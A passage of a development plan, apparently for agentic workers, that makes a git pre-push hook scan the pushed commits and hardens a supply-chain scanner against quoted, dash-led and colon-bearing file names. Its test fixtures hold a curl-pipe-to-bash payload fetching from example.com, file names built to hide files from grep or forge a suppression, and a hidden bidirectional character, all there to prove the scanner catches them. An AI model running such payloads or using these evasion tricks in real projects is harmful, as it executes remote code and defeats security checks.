# Push scan reads the pushed commits Implementation Plan

> **For agentic workers:** use `keel:execute-plan` to implement this task by task.
> Steps use `- [ ]` checkboxes; tick them as you go, on output you read.
> A box for a step you did not perform yourself is ticked only with a note naming what you did
> and did not witness, or left unticked and reported.
> **REQUIRED SUB-SKILL:** `keel:tdd` for every task.

**Goal:** the pre-push hook scans the commits being pushed, with the installed keel's scanner only,
instead of whatever sits in the working tree.
**Stories:** none. `docs/ideas/push-scan-reads-pushed-commits.md` is the requirement, with its open
question answered 2026-09-27; the decisions below are the rest.
**ADRs:** none bear on this. ADR-0003 governs harness hooks, and this is a git hook.
**Architecture:** a new `keel scan --push <remote> <commit>` writes the commit's tree to a
temporary directory with `git archive`, then hashes every file and rewrites from the object store
any file that is missing or does not match its blob, since the pushed tree's own `.gitattributes`
can make `git archive` leave a file out or rewrite one, then checks again and refuses a commit
whose paths the filesystem cannot keep apart. It refuses a commit holding a `.git` path before
extracting anything. It gives the copy a repository of its own, kept outside the copy, with git's
environment cleared and executable bits taken from the commit, and runs the installed scanner
there. It then runs the scanner's new `--secret-paths` mode over every key file a commit in the
push added or changed that the tip does not hold. Task 1b first makes the scanner read the file
names git quotes, which it skipped. The pre-push hook calls it once per pushed
commit, drops its fallback to the repository's own `tests/supply-chain-scan.sh`, and still scans
the working tree when run by hand with no refs.

**Decisions, 2026-09-27, maintainer:**

| Question | Answer |
|---|---|
| Which scanner runs when the pushed tree carries its own `tests/supply-chain-scan.sh` | The installed keel's only, the one `keel` on PATH runs. A branch can never weaken its own check; a scanner rule added on a branch of keel's own repository guards that branch's pushes only once the installed keel carries it. One stated limit: where `keel` on PATH is a symlink into a clone of keel, as on the maintainer's machine, that clone's working tree is the installed keel, so in keel's own repository the checked-out branch's copy runs. docs/03 says so |
| The scanner skips file names git quotes, found by task 2's first quality review | Fixed in this plan, as task 1b, before task 2: the scanner reads NUL-separated lists and refuses a name holding a newline |
| A key the remote holds, changed in the push and then deleted | Caught: the history check covers key files added or modified, not added only |
| No `keel` on PATH at push time | Allow the push and say nothing was scanned, the posture the hook already takes when no scanner is reachable |
| Which content of the push is checked | Each pushed commit's tree in full, plus a refusal for any key, keystore or certificate file a commit in the push added and a later one deleted |

**Facts established while planning, 2026-09-27, each run rather than assumed:**

| Fact | How it was checked |
|---|---|
| `git archive` leaves out a file its tree's `.gitattributes` marks `export-ignore` | A scratch repository with `p.sh export-ignore`: the extracted tree had no `p.sh` |
| In a linked worktree, git runs the pre-push hook with `GIT_DIR` set to that worktree's git directory | A pre-push hook printing `env` in a second worktree printed `GIT_DIR=.../.git/worktrees/w2`; the main worktree printed none |
| `git hash-object --no-filters --stdin-paths` follows a symlink, so a symlink never matches its blob | A symlink to `/etc/hosts` hashed to a different id from its `120000` blob |
| `git update-index -z --chmod=+x --stdin` sets the mode on paths read from stdin | Run in a scratch repository: `git ls-files -s` then showed `100755` |
| `git log --format= --name-only -z` prints a flat NUL-separated list of paths | Read through `od -c` |
| Writing a 417-file tree one `git cat-file` at a time takes 10 s; `git archive` takes 0.15 s | Timed on this repository's `HEAD` |
| On macOS's `/bin/bash` 3.2 with `set -u`, `"${a[@]}"` on an empty array fails with "unbound variable"; `"${!a[@]}"` and `${#a[@]}` do not | Run with `/bin/bash -c 'set -u; ...'` |
| The generated hook passes shellcheck with `for sha in $pushed` over a space-separated string | shellcheck run on the loop in a scratch file |
| `git archive` writes a `.git/config` a tree built with `git mktree` holds, where checkout would refuse it | A scratch commit whose only entry is `.git/config`: `git ls-tree -r` listed it; task 2's first quality review ran its planted `core.fsmonitor` through the scan |
| With `GIT_DIR` and `GIT_WORK_TREE` exported to a directory outside the copy, a `.git/config` inside the copy is not read, and `git ls-files` does not list it | A scratch copy holding `.git/config` and `f.sh`: `git ls-files` printed `f.sh` only |
| `git log -c --diff-filter=AM --name-only` lists a key a merge commit's own resolution adds; without `-c` it does not | A scratch merge that added `prod.key`: listed with `-c`, absent without |
| `git cat-file --batch-check` on `<commit>:<path>` answers `missing` for a path that differs from a held one only in case | `HEAD:A.TXT` beside a held `a.txt` printed `HEAD:A.TXT missing` |
| `git mktree` sorts its input, and `git rev-parse --local-env-vars` lists the variables git reads for a repository | Both run in a scratch repository |

**Concurrent batches:** none. Task 1b and task 2 both change `tests/supply-chain-scan.sh`, task 2
consumes task 1's `--secret-paths`, and tasks 2 and 3 share `bin/keel`, `tests/test-keel.sh`,
`docs/03-install-and-distribution.md` and `CHANGELOG.md`, so the six run in order: 1, 1b, 1c, 1d, 2, 3. Tasks 1c and 1d also change the scanner.

## Global constraints

- Verify commands, from `.keel/profile.json`: test `tests/run-tests.sh`; one test file
  `tests/{name}`, so `tests/test-supply-chain.sh` or `tests/test-keel.sh`; typecheck and build are
  `null`, since there is nothing to compile; lint is:

  ```bash
  shellcheck -x bin/keel bin/keel-fleet lib/*.sh lib/harness/*.sh tests/*.sh tests/evals/run.sh \
    tests/evals/stage.sh hooks/session-start hooks/context-watch hooks/sensitive-guard hooks/done-guard
  ```

- `tests/test-keel.sh` takes about five minutes and `tests/run-tests.sh` about seven. Both print
  nothing until each file finishes. Slow is not hung.
- Lint after each file edit, not at the end of the task.
- Never start on `main`. Work on `sandbox`, which is where this repository's pull requests come
  from.
- `tests/test-keel.sh` run directly inherits the machine's global git config, which only
  `tests/run-tests.sh` isolates. Before the first run, from a directory outside any repository,
  `git config --show-scope --get core.hooksPath` and `git config --show-scope --get init.templateDir`
  must both print nothing; if either prints a value, stop and report, since every guard install in
  the tests would then be refused.
- `bin/keel` runs under `set -uo pipefail` and must run on bash 3.2: never expand `"${arr[@]}"`
  on an array that can be empty without first checking `${#arr[@]}`.
- No em dash and no en dash anywhere: code, comments, strings, docs, commit messages.
- Prose in markdown wraps at 100 columns; tables do not (docs/standards.md, "Prose wraps at 100
  columns; tables do not").
- Every rule a comment states carries its reason (docs/standards.md, "Every rule carries its
  reason").
- A gate is never weakened so this repository can pass it (docs/standards.md, "A gate is never
  weakened so this repository can pass it").
- A line a scanner is wrong about carries `supply-chain-scan: allow <reason>` on that line; never
  widen a pattern or add a file to the skip list (docs/standards.md, "An exception to a scanner is
  written on the line, with its reason"). Every test line in `tests/test-keel.sh` that writes a
  pipe-to-shell payload carries one.
- Shipped prose states the current state; history lives in `CHANGELOG.md` (docs/standards.md,
  "Shipped prose states the current state, and history lives in the changelog").
- Documentation lands in the same commit as the change: a line under `## Unreleased` at the top of
  `CHANGELOG.md`, plus any document the change makes wrong, stating what is true now.
- **Citations into `bin/keel` and `tests/test-keel.sh` use a phrase, never a line number**, in
  the form `` bin/keel#<text from the line> ``; `tests/validate-citations.sh` refuses a line number
  into either. A phrase must occur **once** in its file (`grep -cF '<phrase>' <file>`) and contain
  no `|`.
- After an edit that inserts or deletes lines in any tracked file, run `tests/validate-citations.sh`
  and repair what it reports; then grep the repository for `<that file>:<N>` citations with N at or
  after the edit, compare `git show HEAD:<file> | sed -n '<N>p'` with the current line N, and
  repair each whose target moved by citing a phrase instead. Leave citations that were already
  wrong at HEAD alone. `tests/supply-chain-scan.sh` is cited by line number from
  `docs/ideas/push-scan-reads-pushed-commits.md`, `docs/audits/2026-08-19-efficiency.md` and
  `docs/plans/2026-08-18-usable-profile.md`; task 1 moves those lines and names each repair.
- The plan itself is scanned by `tests/supply-chain-scan.sh`, which reads untracked files, so every
  pipe-to-shell line in it carries an allow marker too.
- The guard code is `guard_hook_body` (`` bin/keel#guard_hook_body() { ``) and `cmd_guard`
  (`` bin/keel#cmd_guard() { ``); the scan command is `cmd_scan` (`` bin/keel#cmd_scan() { ``).
- `fixture <stack>` in `tests/test-keel.sh` hands out a copy of a committed git repository. The
  `bare` stack has **no commit**, so every new case here uses `node-ts`, which has one. Their
  `.git/hooks` holds only git's `.sample` files.
- Stage named paths only. Never `git add -A`, `git add .` or `git commit -a`.
- Commit messages are conventional, title and body only: no `Co-Authored-By`, no robot emoji, no
  generated-with line.
- Do not delete a file you did not create, except where a task names it. If `git status` shows
  something unexpected, report it and leave it alone.

---

### Task 1: The scanner checks key-file names read from stdin

**Story:** none; the "Tip + key filenames" decision above.

**Execution, 2026-09-27:** delegated. Every step was performed by the implementer and ticked on its
reported output: step 2 `47 passed, 2 failed` with the two predicted FAILs, step 4 `49 passed, 0 failed`
and `OK    1776 citations checked`, step 5 `All test files passed`. The coordinator did not witness the
step 2 or step 5 runs; the spec reviewer re-ran step 4's commands and matched them. Spec review
COMPLIES. Quality review: nothing blocking; should-fix items are in the run report. One declared
addition: the two paragraphs the new citations pushed past 100 columns were rewrapped, words unchanged.

**Files:**
- Modify: `tests/supply-chain-scan.sh`
- Modify: `docs/ideas/push-scan-reads-pushed-commits.md`, `docs/audits/2026-08-19-efficiency.md`,
  `docs/plans/2026-08-18-usable-profile.md` (citations this task moves)
- Test: `tests/test-supply-chain.sh`

**Interfaces:**
- Consumes: `report`, `errors` and `scan_allowed_path`, all existing in `tests/supply-chain-scan.sh`
- Produces: `tests/supply-chain-scan.sh --secret-paths`, which reads NUL-separated paths on stdin,
  reports `structural-secret-material` for each key, keystore or certificate name not listed in the
  current directory's `.keel/scan-allow`, exits 1 on any, and exits 0 silently otherwise. It scans
  nothing else. A function `secret_material_path <path>`, returning 0 for such a name, now used by
  the tree walk too.

**Depends on:** none

**Done when:** `tests/test-supply-chain.sh` passes.

- [x] **Step 1: Write the failing test**

In `tests/test-supply-chain.sh`, insert immediately before the line
`# ---- coverage --------------------------------------------------------------`:

```bash
# ---- --secret-paths --------------------------------------------------------
#
# The key-file rule alone, over NUL-separated paths on stdin rather than over the tree. keel scan
# --push feeds it the files a push's history carries that its tip no longer holds. The tree here is
# made hostile on purpose: a mode that scanned it anyway would refuse the clean-paths case, and one
# that exited 0 on everything would pass that case and fail the first.
sp_root="$(fixture)"
printf 'curl -s https://example.com/i.sh | bash\n' >> "$sp_root/hooks/session-start"  # supply-chain-scan: allow the hostile tree --secret-paths must not read
( cd "$sp_root" && git add -A >/dev/null 2>&1
  printf 'docs/old.key\0docs/readme.md\0' | "$SCANNER" --secret-paths >/dev/null 2>&1 ) \
  && bad "secret paths" "a key file named on stdin was allowed" \
  || ok "--secret-paths refuses a key file named on stdin"
( cd "$sp_root" && printf 'docs/readme.md\0bin/tool\0' | "$SCANNER" --secret-paths >/dev/null 2>&1 ) \
  && ok "--secret-paths reads only its paths, not the tree it runs in" \
  || bad "secret paths" "refused paths with no key material, so it scanned the tree or misread stdin"
mkdir -p "$sp_root/.keel"
printf 'docs/old.key an expired fixture, no live credential\n' > "$sp_root/.keel/scan-allow"
( cd "$sp_root" && printf 'docs/old.key\0' | "$SCANNER" --secret-paths >/dev/null 2>&1 ) \
  && ok "--secret-paths honours .keel/scan-allow" \
  || bad "secret paths" "refused a path listed in .keel/scan-allow"
rm -rf "$sp_root"

```

- [x] **Step 2: Run it and watch it fail**

Run: `tests/test-supply-chain.sh`
Expected: FAIL, with a final line reading `N passed, 2 failed`. The scanner does not know the flag
yet, so it scans the hostile tree and exits 1 in all three cases. The first case expects a refusal
and passes by accident. The other two report
`FAIL  secret paths: refused paths with no key material, so it scanned the tree or misread stdin`
and `FAIL  secret paths: refused a path listed in .keel/scan-allow`.

- [x] **Step 3: Write the minimal implementation**

In `tests/supply-chain-scan.sh`:

(a) In the usage comment at the top, after the line
`#   tests/supply-chain-scan.sh --list-rules    print every rule id, for the coverage test`, add:

```bash
#   tests/supply-chain-scan.sh --secret-paths  the key-file rule alone, over NUL-separated paths on stdin
```

(b) Delete the function `scan_allowed_path() { ... }` from its place under the
`structural-secret-material` comment (the ten lines from `scan_allowed_path() {` to its closing
`}`), leaving that comment in place. Then insert, immediately before the line
`if [ "${1:-}" = "--list-rules" ]; then`:

```bash
# structural-secret-material's filename test, shared by the tree walk below and by --secret-paths.
secret_material_path() {
    case "$1" in
        *.pfx|*.p12|*.jks|*.keystore|*.truststore|*.pem|*.key|*.der|*.asc|*id_rsa|*id_dsa|*id_ecdsa|*id_ed25519) return 0 ;;
        *) return 1 ;;
    esac
}

# .keel/scan-allow, read from the current directory: one path per line, a reason after a space. See
# structural-secret-material below. Defined here because --secret-paths needs it before the walk.
scan_allowed_path() {
    [ -f .keel/scan-allow ] || return 1
    while IFS= read -r entry; do
        entry="${entry%% *}"
        [ -n "$entry" ] || continue
        case "$entry" in \#*) continue ;; esac
        [ "$entry" = "$1" ] && return 0
    done < .keel/scan-allow
    return 1
}

```

(c) Immediately after the `--list-rules` block's closing `fi`, insert:

```bash

# --secret-paths: structural-secret-material alone, over NUL-separated paths on stdin rather than
# over this tree. keel scan --push feeds it every file a commit in the push added that the tip no
# longer holds: git keeps a committed key in history, so the push carries it to the remote though no
# tree being pushed shows it. Nothing else is scanned, since the tip's own tree is scanned in full
# by the ordinary run.
if [ "${1:-}" = "--secret-paths" ]; then
    while IFS= read -r -d '' f; do
        [ -n "$f" ] || continue
        secret_material_path "$f" || continue
        if scan_allowed_path "$f"; then
            printf 'ALLOW %s [structural-secret-material] listed in .keel/scan-allow\n' "$f"
            continue
        fi
        report "$f [structural-secret-material] a key, keystore or certificate a commit in this push added and a later one deleted. git keeps it in history, so the remedy is rotating the credential, not deleting the file"
    done
    [ "$errors" -eq 0 ] && exit 0
    printf '\n%s key file(s) in the history this push carries.\n' "$errors"
    exit 1
fi
```

(d) In the `structural-secret-material` loop, replace

```bash
    case "$f" in
        *.pfx|*.p12|*.jks|*.keystore|*.truststore|*.pem|*.key|*.der|*.asc|*id_rsa|*id_dsa|*id_ecdsa|*id_ed25519) ;;
        *) continue ;;
    esac
```

with

```bash
    secret_material_path "$f" || continue
```

Lint: run the shellcheck command from the global constraints.

- [x] **Step 4: Run it and watch it pass**

Run: `tests/test-supply-chain.sh`
Expected: PASS, a final line reading `N passed, 0 failed`, including the three
`--secret-paths` cases and `every rule is exercised by a sample`.

Then, in `docs/ideas/push-scan-reads-pushed-commits.md`, replace the line citations into
`tests/supply-chain-scan.sh`, which this task moved, with the Edit tool. Each pair is old text,
then new text. They sit in a fence so the citation checker, which skips fences, does not read the
old text as a claim of this plan's own:

```text
OLD (both occurrences, replace_all): `tests/supply-chain-scan.sh:165`
NEW: `tests/supply-chain-scan.sh#git ls-files --cached --others --exclude-standard`

OLD: `list_files` in `tests/supply-chain-scan.sh:162`
NEW: `list_files` (`tests/supply-chain-scan.sh#list_files() {`)

OLD: with the comment at `tests/supply-chain-scan.sh:159`
NEW: with the comment above `list_files` in `tests/supply-chain-scan.sh` at `f0b6d44`
```

The last one is pinned to a commit rather than cited, because task 3 rewrites that comment and
the record quotes its old wording.

Two more documents cite `tests/supply-chain-scan.sh` by a line number that is correct at HEAD and
that this task moves. Replace each with a phrase, the same way:

```text
In docs/audits/2026-08-19-efficiency.md
OLD: `tests/supply-chain-scan.sh:172-176`
NEW: `tests/supply-chain-scan.sh#One grep per rule over the whole file list`

In docs/plans/2026-08-18-usable-profile.md
OLD: `tests/supply-chain-scan.sh:205-218`
NEW: `tests/supply-chain-scan.sh#*"supply-chain-scan: allow"*)`
```

Then run `tests/validate-citations.sh` and repair anything else it reports, per the global
constraints.

- [x] **Step 5: Run the suite at the unit boundary, then hand over**

Run: `tests/run-tests.sh`
Expected: `All test files passed`, or reds this task did not cause, each named and matched against
the start record. This is the one suite run the task schedules.

```bash
git add tests/supply-chain-scan.sh tests/test-supply-chain.sh docs/ideas/push-scan-reads-pushed-commits.md \
        docs/audits/2026-08-19-efficiency.md docs/plans/2026-08-18-usable-profile.md
git status --porcelain
```

Stage exactly those paths and stop. **Do not commit.** The coordinator commits after both review
passes, with `git commit -m "feat(scan): a --secret-paths mode that checks key-file names from stdin"`.
Paste the `git status --porcelain` output into your report; if it lists anything this task did not
touch, say so and leave it unstaged.

---

### Task 1b: The scanner reads the file names git would quote

**Story:** none; the "Quoted names" decision above, and task 1's quality review.

**Execution, 2026-09-27:** delegated. Every step was performed by the implementer and ticked on its
reported output: step 2 `49 passed, 6 failed` with the six predicted failures, step 4 `55 passed, 0 failed`
and `OK    1776 citations checked`, step 5 `All test files passed`. The spec reviewer reproduced step 2's
failures against the old scanner and step 4's pass; the coordinator witnessed neither suite run. Spec
review COMPLIES. Quality review: nothing this diff introduced blocks. It found pre-existing false passes
beside it; the maintainer put the leading-dash and colon-forged-suppression ones in task 1c and had the
other two filed as an idea record.

**Files:**
- Modify: `tests/supply-chain-scan.sh`
- Modify: `CHANGELOG.md`
- Test: `tests/test-supply-chain.sh`

**Interfaces:**
- Consumes: `m_untracked` and `run`, existing in `tests/test-supply-chain.sh`; `report`, existing
  in `tests/supply-chain-scan.sh`
- Produces: nothing new. `list_files` prints NUL-separated paths; the tree walk refuses a name
  holding a newline; the executable rule reads `git ls-files -s -z`; `--secret-paths` reads a final
  path that has no trailing NUL

**Depends on:** task 1

**Done when:** `tests/test-supply-chain.sh` passes.

- [x] **Step 1: Write the failing test**

In `tests/test-supply-chain.sh`, insert immediately before the line
`# ---- a rule that cannot compile -------------------------------------------`:

```bash
# ---- names git quotes ------------------------------------------------------
#
# git ls-files quotes a name holding a byte outside printable ASCII, a tab, a double quote or a
# backslash, unless it is asked for NUL-separated output, and a quoted name matches no file on disk.
# The scan skipped every such file, so a payload in one passed. The payload is m_untracked's, moved
# to each name.
m_nonascii()  { m_untracked "$1"; mv "$1/hooks/not-added-yet" "$1/bin/caf$(printf '\303\251').sh"; }
run "a payload in a file with a non-ASCII name is rejected" 1 m_nonascii
m_tabname()   { m_untracked "$1"; mv "$1/hooks/not-added-yet" "$1/bin/a$(printf '\t')b.sh"; }
run "a payload in a file with a tab in its name is rejected" 1 m_tabname
m_quotename() { m_untracked "$1"; mv "$1/hooks/not-added-yet" "$1/bin/a\"b.sh"; }
run "a payload in a file with a double quote in its name is rejected" 1 m_quotename

# A name holding a newline cannot go in the one-path-per-line lists the rules read, so it is refused
# rather than skipped: a file the scan cannot read is not one it may pass.
m_nlname()    { printf 'echo ok\n' > "$1/docs/a$(printf '\nb').md"; }
run "a file name holding a newline is refused" 1 m_nlname

# The executable rule reads the index, whose listing quotes the same names: an allowed executable
# with such a name read as a different, unallowed path.
m_execname()  { local f; f="$1/tests/caf$(printf '\303\251').sh"
                printf '#!/bin/sh\necho hi\n' > "$f"; chmod +x "$f"; }
run "an allowed executable with a non-ASCII name is not flagged" 0 m_execname

```

Then, in the same file, immediately before the line
`# ---- coverage --------------------------------------------------------------`, insert:

```bash
# The last path on stdin needs no trailing NUL. A hand-written list without one is read in full
# rather than losing its final path, which here is the key file.
sp_root="$(fixture)"
( cd "$sp_root" && printf 'docs/readme.md\0docs/old.key' | "$SCANNER" --secret-paths >/dev/null 2>&1 ) \
  && bad "secret paths" "a key file named last, with no trailing NUL, was allowed" \
  || ok "--secret-paths reads a final path with no trailing NUL"
rm -rf "$sp_root"

```

- [x] **Step 2: Run it and watch it fail**

Run: `tests/test-supply-chain.sh`
Expected: FAIL, with a final line reading `N passed, 6 failed`: the four `run` cases expecting 1
report `expected exit 1, got 0`, `an allowed executable with a non-ASCII name is not flagged`
reports `expected exit 0, got 1`, and `secret paths: a key file named last, with no trailing NUL,
was allowed`.

- [x] **Step 3: Write the minimal implementation**

In `tests/supply-chain-scan.sh`:

(a) In `--secret-paths`, replace the line `    while IFS= read -r -d '' f; do` that follows
`if [ "${1:-}" = "--secret-paths" ]; then` with:

```bash
    # `|| [ -n "$f" ]` keeps a final path with no trailing NUL, which read otherwise drops.
    while IFS= read -r -d '' f || [ -n "$f" ]; do
```

(b) Replace the body of `list_files` so the function reads:

```bash
list_files() {
    if git rev-parse --git-dir >/dev/null 2>&1; then
        git ls-files --cached --others --exclude-standard -z
    else
        find . -type f -not -path './.git/*' -print0
    fi
}
```

and immediately above `list_files() {`, after the comment paragraph ending `and the
suppression marker is there for it.`, add:

```bash
#
# NUL-separated, never one name per line: without -z git quotes a name holding a byte outside
# printable ASCII, a tab, a double quote or a backslash, the quoted form matches no file on disk,
# and every such file went unscanned.
```

(c) In the walk that builds the five lists, replace

```bash
while IFS= read -r f; do
    [ -n "$f" ] || continue
    printf '%s\n' "$f" >> "$FULL_LIST"
```

with

```bash
while IFS= read -r -d '' f; do
    [ -n "$f" ] || continue
    f="${f#./}"
    # The lists below hold one path per line, so a name holding a newline cannot go in them. It is
    # refused rather than skipped: a file the scan cannot read is not a file it may pass.
    case "$f" in
        *$'\n'*) report "$(printf '%q' "$f") has a newline in its name, which this scan cannot read. Rename it"; continue ;;
    esac
    printf '%s\n' "$f" >> "$FULL_LIST"
```

(d) In `structural-executable`, replace

```bash
    while IFS= read -r f; do
        [ -n "$f" ] || continue
        allowed_executable "$f" && continue
```

with

```bash
    # The index listing is NUL-separated for the reason list_files is: a quoted name reads as a
    # different path, one allowed_executable does not allow.
    while IFS= read -r -d '' e; do
        [ "${e%% *}" = 100755 ] || continue
        f="${e#*$'\t'}"
        allowed_executable "$f" && continue
```

and replace its closing line
`    done < <(git ls-files -s | awk '$1=="100755"{ $1=""; $2=""; $3=""; sub(/^[ \t]+/,""); print }')`
with `    done < <(git ls-files -s -z)`.

Lint: run the shellcheck command from the global constraints.

In `CHANGELOG.md`, add as the first bullet under `## Unreleased`:

```markdown
- The supply chain scan reads file names git quotes (a byte outside printable ASCII, a tab, a
  double quote, a backslash), which it skipped, so a payload in such a file no longer passes; a
  name holding a newline is refused. `--secret-paths` reads a final path with no trailing NUL.
```

- [x] **Step 4: Run it and watch it pass**

Run: `tests/test-supply-chain.sh`
Expected: PASS, a final line reading `N passed, 0 failed`, including the six new cases and
`every rule is exercised by a sample`.

Then run `tests/validate-citations.sh` and repair what it reports, per the global constraints.
`` tests/supply-chain-scan.sh#git ls-files --cached --others --exclude-standard `` in
`docs/ideas/push-scan-reads-pushed-commits.md` still resolves, because `-z` goes at the end of
that line.

- [x] **Step 5: Run the suite at the unit boundary, then hand over**

Run: `tests/run-tests.sh`
Expected: `All test files passed`, or reds this task did not cause, each named and matched against
the start record. This is the one suite run the task schedules.

```bash
git add tests/supply-chain-scan.sh tests/test-supply-chain.sh CHANGELOG.md
git status --porcelain
```

Stage exactly those paths and stop. **Do not commit.** The coordinator commits after both review
passes, with `git commit -m "fix(scan): read the file names git quotes, which the scan skipped"`.
Paste the `git status --porcelain` output into your report; if it lists anything this task did not
touch, say so and leave it unstaged.

---

### Task 1c: A file name can neither hide files from the scan nor forge a suppression

**Story:** none; task 1b's quality review, and the maintainer's 2026-09-27 choice to fix these two
here. Both are false passes that predate this plan, each reproduced by that review: a root file
named `-` made `grep` read the walk's own input as its stdin, so every file after it went unscanned,
and a name like `-x.sh` was read as grep options; and the pattern loop split a hit at its first
colon, so a file named `docs/x:y:supply-chain-scan: allow looks fine.md` suppressed its own finding.
The review's other two, the same quoted-name bug in `tests/no-internal-leaks.sh` and in the key-file
check `write_ci` generates, are filed in `docs/ideas/file-names-the-other-scans-misread.md`.

**Revised 2026-09-27 after the first attempt was rejected.** Its quality review found one blocking
defect the specified change introduced, reproduced in Alpine: BusyBox grep has no `--null`, exits
2 on it, and the loop's `2>/dev/null` turned that into a scan with no pattern findings that read
as clean. It also found that two of the `./` changes had no test that failed without them, and
that on GNU grep 3.4 and older a "binary file matches" line on stdout would desynchronise the
two-read loop and drop a finding. So the task now proves `--null` works before scanning, passes
`-a` to the pattern grep, and tests each `./`. The attempt was discarded unstaged. The same review
found the pattern grep's locale can hide a payload in CI; that changes what a rule matches, so it
is filed in the idea record rather than fixed here. `grep` on the maintainer's machine is ugrep
7.8.4, and on CI it is GNU grep.

**Execution, 2026-09-27, second attempt:** delegated to a fresh implementer. It stopped once, on the
plan's "eight new cases" where the block adds seven; the plan's count was wrong and was corrected in
`ceb2ec3`. Ticked on its reported output: step 2 `56 passed, 6 failed` with the six predicted failures,
step 4 `62 passed, 0 failed`, step 5 `All test files passed`. The spec reviewer reproduced step 2 against
the old scanner, reverted each change alone to confirm a test catches it, and reran step 4; the
coordinator witnessed neither suite run. Spec review COMPLIES. Quality review: nothing blocking;
should-fix items are in the run report, and the orphan-hook dash-name bug it found is in the idea record.

**Files:**
- Modify: `tests/supply-chain-scan.sh`
- Modify: `CHANGELOG.md`
- Test: `tests/test-supply-chain.sh`

**Interfaces:**
- Consumes: `m_untracked`, `m_pipe`, `run`, `fixture`, `ok`, `bad` and `SCANNER`, existing in
  `tests/test-supply-chain.sh`; `report` and `check_patterns`, existing in
  `tests/supply-chain-scan.sh`
- Produces: nothing new. Every `grep` over a listed file names it as `./<path>`, the pattern loop
  reads `grep -a --null` output, and a grep without `--null` fails the scan

**Depends on:** task 1b

**Done when:** `tests/test-supply-chain.sh` passes.

- [x] **Step 1: Write the failing test**

In `tests/test-supply-chain.sh`, insert immediately before the line
`# ---- a rule that cannot compile -------------------------------------------`:

```bash
# ---- names grep misreads ---------------------------------------------------
#
# A root file named - read as grep's stdin, which in the walk is the walk's own input, so every file
# listed after it went unscanned. One payload is in bin/, which sorts after -, and one is in - itself,
# which the pattern grep read as its own stdin too. In a plugin repository the - file was then
# flagged as structural-binary, so the assertions are on the payloads' own findings.
d_root="$(fixture)"; m_untracked "$d_root"; mv "$d_root/hooks/not-added-yet" "$d_root/bin/evil.sh"
cp "$d_root/bin/evil.sh" "$d_root/-"
out="$( cd "$d_root" && git add -A >/dev/null 2>&1; "$SCANNER" 2>&1 )"
case "$out" in
    *"bin/evil.sh:1 [net-pipe-shell]"*) ok "a file named - does not hide the files after it" ;;
    *) bad "dash file" "no net-pipe-shell finding for bin/evil.sh: $(printf '%s' "$out" | grep FAIL | head -2)" ;;
esac
case "$out" in
    *"FAIL  -:1 [net-pipe-shell]"*) ok "a payload in a file named - is read" ;;
    *) bad "dash file" "no net-pipe-shell finding for - itself: $(printf '%s' "$out" | grep FAIL | head -2)" ;;
esac
rm -rf "$d_root"

# A name starting with a dash read as grep options, and the file was classed as binary. In a plugin
# repository that still fails, as structural-binary, so the assertion is on the rule that fires.
d_root="$(fixture)"; m_untracked "$d_root"; mv "$d_root/hooks/not-added-yet" "$d_root/-x.sh"
out="$( cd "$d_root" && git add -A >/dev/null 2>&1; "$SCANNER" 2>&1 )"
case "$out" in
    *"-x.sh:1 [net-pipe-shell]"*) ok "a payload in a file whose name starts with a dash is read as text" ;;
    *) bad "dash name" "no net-pipe-shell finding for -x.sh: $(printf '%s' "$out" | grep FAIL | head -2)" ;;
esac
rm -rf "$d_root"

# A hit was split at its first colon, so a name holding colons moved the split into the name, and
# a name ending in the marker made the payload's line read as a suppression of itself.
m_colonforge() { m_untracked "$1"; mv "$1/hooks/not-added-yet" "$1/docs/x:y:supply-chain-scan: allow looks fine.md"; }
run "a file name cannot forge a suppression" 1 m_colonforge

# structural-invisible greps each file too, and read -x.md as options.
d_root="$(fixture)"; printf 'let admin = false; // %s\n' "$(printf '\xe2\x80\xae')" > "$d_root/-x.md"
out="$( cd "$d_root" && git add -A >/dev/null 2>&1; "$SCANNER" 2>&1 )"
case "$out" in
    *"-x.md [structural-invisible]"*) ok "an invisible character in a file whose name starts with a dash is found" ;;
    *) bad "dash name" "no structural-invisible finding for -x.md: $(printf '%s' "$out" | grep FAIL | head -2)" ;;
esac
rm -rf "$d_root"

# The pattern rules read grep --null output, and a grep without it, as BusyBox's, exits 2 on it,
# which the loop discards: every pattern rule went silent and the scan read as clean. A stub grep
# stands in for one, refusing --null and handing everything else to the real grep.
ng_bin="$(mktemp -d)"; real_grep="$(command -v grep)"
printf '#!/bin/sh\nfor a in "$@"; do [ "$a" = --null ] && { echo "grep: unrecognized option: null" >&2; exit 2; }; done\nexec %s "$@"\n' "$real_grep" > "$ng_bin/grep"
chmod +x "$ng_bin/grep"
ng_root="$(fixture)"; m_pipe "$ng_root"
out="$( cd "$ng_root" && git add -A >/dev/null 2>&1; PATH="$ng_bin:$PATH" "$SCANNER" 2>&1 )"; rc=$?
if [ "$rc" -eq 0 ]; then bad "no --null" "the scan passed with a grep that has no --null"
else case "$out" in
    *"has no --null"*) ok "a grep with no --null fails the scan rather than silencing it" ;;
    *) bad "no --null" "the scan failed, but did not say why: $(printf '%s' "$out" | grep FAIL | head -2)" ;;
esac; fi
rm -rf "$ng_bin" "$ng_root"

# The one quoted kind task 1b named and did not test.
m_bsname()    { m_untracked "$1"; mv "$1/hooks/not-added-yet" "$1/bin/a\\b.sh"; }
run "a payload in a file with a backslash in its name is rejected" 1 m_bsname

```

- [x] **Step 2: Run it and watch it fail**

Run: `tests/test-supply-chain.sh`
Expected: FAIL, with a final line reading `N passed, 6 failed`:

- `dash file: no net-pipe-shell finding for bin/evil.sh`
- `dash file: no net-pipe-shell finding for - itself`
- `dash name: no net-pipe-shell finding for -x.sh`
- `dash name: no structural-invisible finding for -x.md`
- `no --null: the scan failed, but did not say why`, since today's scanner does not use `--null`
  and finds the payload
- `a file name cannot forge a suppression` reporting `expected exit 1, got 0`

The backslash case passes already, since task 1b fixed quoted names; it is here to keep that true.

- [x] **Step 3: Write the minimal implementation**

In `tests/supply-chain-scan.sh`:

(a) In the walk that builds the five lists, replace
`    if LC_ALL=C grep -qI . "$f" 2>/dev/null; then` with:

```bash
    # ./ so that a file named - is a file and not grep's stdin, which here is this loop's own
    # input, and a name like -x.sh is not read as options.
    if LC_ALL=C grep -qI . "./$f" 2>/dev/null; then
```

(b) In `structural-invisible`, replace `"$f" 2>/dev/null; then` at the end of the line
`    if LC_ALL=C grep -qE "$(printf '\xe2\x80[\xaa-\xae\x8b-\x8f]|\xe2\x81[\xa6-\xa9]')" "$f" 2>/dev/null; then`
with `"./$f" 2>/dev/null; then`, so the line reads:

```bash
    if LC_ALL=C grep -qE "$(printf '\xe2\x80[\xaa-\xae\x8b-\x8f]|\xe2\x81[\xa6-\xa9]')" "./$f" 2>/dev/null; then
```

